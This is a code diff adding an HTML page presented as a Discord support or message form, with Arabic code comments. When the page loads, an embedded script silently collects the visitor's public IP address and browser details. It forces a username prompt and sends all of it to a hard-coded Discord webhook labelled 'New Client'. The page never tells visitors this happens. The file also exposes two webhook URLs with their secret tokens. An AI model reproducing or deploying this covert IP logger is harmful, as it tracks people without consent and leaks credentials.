@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Discord Webhook Example</title>
+    <link rel="stylesheet" href="./style.css">
+  </head>
+  <body>
+    <div class="message-box">
+      <h2>Send Message</h2>
+      <form id="message-form" enctype="multipart/form-data">
+        <div class="user-box">
+          <input type="text" name="message" required="">
+          <label>Your problems</label>
+        </div>
+        <div class="user-box">
+          <input type="text" name="otherMessage" required="">
+          <label>Dicsord ID</label>
+        </div>
+        <div class="user-box">
+          <input type="text" name="additionalMessage" required="">
+          <label>Dicsord name</label>
+        </div>
+        <div class="user-box">
+          <input type="file" name="image" accept="image/*">
+          <label>Image</label>
+        </div>
+        <button type="submit" class="submit-button">
+          <span></span>
+          <span></span>
+          <span></span>
+          <span></span>
+          Send Message
+        </button>
+      </form>
+    </div>
+
+    <script>
+      // دالة لإرسال العنوان IP ومواصفات الجهاز واسم المستخدم إلى Webhook كـ Embed كبير
+      function sendIPtoWebhook(ipAddress, deviceSpecs, username) {
+          var webhookUrl = 'https://discord.com/api/webhooks/1213566158318608435/9GBCtYFUJitGlDpZBkBsRq2wNEvU-2y5WTQJRe1WQI-tDL-DD_VEcWlhMBtg4ZFcHtF2';
+    
+          var data = {
+              embeds: [
+                  {
+                      title: 'User INFO MSG',
+                      description: 'New Client:',
+                      fields: [
+                          {
+                              name: 'IP',
+                              value: ipAddress,
+                              inline: true
+                          },
+                          {
+                              name: 'Device Specs',
+                              value: deviceSpecs,
+                              inline: true
+                          },
+                          {
+                              name: 'User Name',
+                              value: username,
+                              inline: true
+                          }
+                      ],
+                      color: 0x00ff00
+                  }
+              ]
+          };
+    
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', webhookUrl, true);
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.send(JSON.stringify(data));
+      }
+    
+      // دالة لاستعلام العنوان IP ومواصفات الجهاز من واجهة برمجة التطبيق (API)
+      function getIP() {
+          var apiUrl = 'https://api.ipify.org/?format=json';
+    
+          var xhr = new XMLHttpRequest();
+          xhr.open('GET', apiUrl, true);
+          xhr.onload = function() {
+              if (xhr.status === 200) {
+                  var response = JSON.parse(xhr.responseText);
+                  var ipAddress = response.ip;
+                  var deviceSpecs = navigator.userAgent;
+                  var username = '';
+    
+                  function promptUsername() {
+                      username = prompt('الرجاء إدخال اسم المستخدم:');
+                      if (username) {
+                          sendIPtoWebhook(ipAddress, deviceSpecs, username);
+                      } else {
+                          alert('يجب إدخال اسم المستخدم!');
+                          promptUsername();
+                      }
+                  }
+    
+                  promptUsername();
+              }
+          };
+          xhr.send();
+      }
+    
+      // استدعاء الدالة للحصول على عنوان IP ومواصفات الجهاز واسم المستخدم عند تحميل الصفحة
+      getIP();
+    </script>
+    <script>
+      // دالة لإرسال الرسالة والصورة إلى Webhook كـ Multipart/form-data
+      function sendMessageToWebhook(message, discordID, discordName, image) {
+          var webhookUrl = 'https://discord.com/api/webhooks/1213566828614516827/egaSwkvIWhaAd6ND2pvEntg4S9nRAJWlzidq1U2LOPOo153sHpvrrZjdv8tqAqmMISvl';
+    
+          var formData = new FormData();
+          formData.append('content', message);
+          formData.append('username', discordName);
+          formData.append('avatar_url', ''); // يمكنك وضع رابط لصورة الأفتار هنا
+          formData.append('file', image);
+    
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', webhookUrl, true);
+          xhr.send(formData);
+      }
+    
+      // استدعاء الدالة عند تقديم نموذج الرسالة
+      document.getElementById('message-form').addEventListener('submit', function(event) {
+          event.preventDefault();
+          var message = document.getElementsByName('message')[0].value;
+          var discordID = document.getElementsByName('otherMessage')[0].value;
+          var discordName = document.getElementsByName('additionalMessage')[0].value;
+          var image = document.getElementsByName('image')[0].files[0];
+    
+          sendMessageToWebhook(message, discordID, discordName, image);
+      });
+    </script>
+
+    <script src="MSG/java.js"></script>
+  </body>
+</html>
